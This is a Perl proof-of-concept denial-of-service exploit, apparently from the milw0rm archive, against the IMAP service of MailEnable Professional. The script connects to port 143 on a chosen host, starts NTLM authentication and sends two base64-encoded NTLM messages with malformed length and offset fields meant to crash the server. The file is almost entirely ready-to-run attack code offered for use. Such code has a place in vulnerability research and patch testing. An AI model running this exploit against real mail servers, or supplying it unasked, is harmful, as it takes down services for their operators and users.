#!/usr/bin/perl
#
# maildisable-v7.pl
#
# Mail Enable Professional/Enterprise v2.32-7 (win32)
# by mu-b - Wed Feb 14 2007
#
# - Tested on: Mail Enable Professional v2.37 (win32)
#
########

use Getopt::Std; getopts('t:', \%arg);
use Socket;
use MIME::Base64;

&print_header;

my $target;

if (defined($arg{'t'})) { $target = $arg{'t'} }
if (!(defined($target))) { &usage; }

my $imapd_port = 143;
my $send_delay = 2;

my $PAD = 'A';

if (connect_host($target, $imapd_port)) {
    print("-> * Connected\n");
    send(SOCKET, "1 AUTHENTICATE NTLM\r\n", 0);
    sleep($send_delay);

    $buf = ($PAD x 12).
           "\xfa\xff\xff\xff".
           ($PAD x 12);
    send(SOCKET, encode_base64($buf)."\r\n", 0);
    sleep($send_delay);

    $buf = ($PAD x 28).
           "\x00\x01".
           ($PAD x 2).
           "\xff\xff\xff\x7f";
    send(SOCKET, encode_base64($buf)."\r\n", 0);
    sleep($send_delay);

    print("-> * Successfully sent payload!\n");
}

sub print_header {
    print("MailEnable Pro v2.37 DoS POC\n");
    print("by: <mu-b\@digit-labs.org>\n\n");
}

sub usage {
    print(qq(Usage: $0 -t <hostname>

     -t <hostname>    : hostname to test
));

    exit(1);
}

sub connect_host {
    ($target, $port) = @_;
    $iaddr  = inet_aton($target)                 || die("Error: $!\n");
    $paddr  = sockaddr_in($port, $iaddr)         || die("Error: $!\n");
    $proto  = getprotobyname('tcp')              || die("Error: $!\n");

    socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
    connect(SOCKET, $paddr)                      || die("Error: $!\n");
    return(1338);
}

# milw0rm.com [2007-02-14]
